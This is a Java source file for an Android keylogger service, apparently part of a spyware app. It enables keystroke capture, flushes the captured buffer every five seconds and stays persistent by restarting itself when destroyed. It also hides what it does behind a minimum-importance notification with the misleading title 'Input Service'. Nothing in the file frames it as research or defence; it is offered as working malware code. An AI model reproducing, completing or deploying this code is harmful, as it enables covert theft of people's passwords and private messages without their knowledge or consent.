package com.xrc.system.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Color;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import com.xrc.system.R;
import com.xrc.system.core.Constants;
import com.xrc.system.features.Keylogger;

public class KeyloggerService extends Service {
    private static final String TAG = Constants.TAG + ":KeylogSvc";
    private Handler handler;
    private Runnable flushTask;

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        createNotificationChannel();
        startForegroundWithType();
        Keylogger.get(this).enable();
        startFlushLoop();
        Log.i(TAG, "KeyloggerService started");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        Keylogger.get(this).disable();
        if (handler != null) handler.removeCallbacksAndMessages(null);
        Intent restart = new Intent(this, KeyloggerService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restart);
        } else {
            startService(restart);
        }
        super.onDestroy();
    }

    private void startForegroundWithType() {
        Notification notification = buildNotification();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(Constants.NOTIF_ID_KEYLOGGER, notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
                            | ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(Constants.NOTIF_ID_KEYLOGGER, notification);
        }
    }

    private Notification buildNotification() {
        Intent intent = new Intent(this, com.xrc.system.ui.MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, intent,
                PendingIntent.FLAG_IMMUTABLE);
        return new Notification.Builder(this, Constants.CHANNEL_ID + "_kl")
                .setContentTitle("Input Service")
                .setContentText("Processing text input...")
                .setSmallIcon(android.R.drawable.ic_menu_edit)
                .setContentIntent(pi)
                .setOngoing(true)
                .build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    Constants.CHANNEL_ID + "_kl",
                    "Input Service",
                    NotificationManager.IMPORTANCE_MIN);
            channel.setDescription("Text input processing");
            channel.setShowBadge(false);
            channel.setSound(null, null);
            channel.enableVibration(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }
    }

    private void startFlushLoop() {
        flushTask = () -> {
            Keylogger.get(this).flushBuffer();
            handler.postDelayed(flushTask, 5000);
        };
        handler.postDelayed(flushTask, 5000);
    }
}
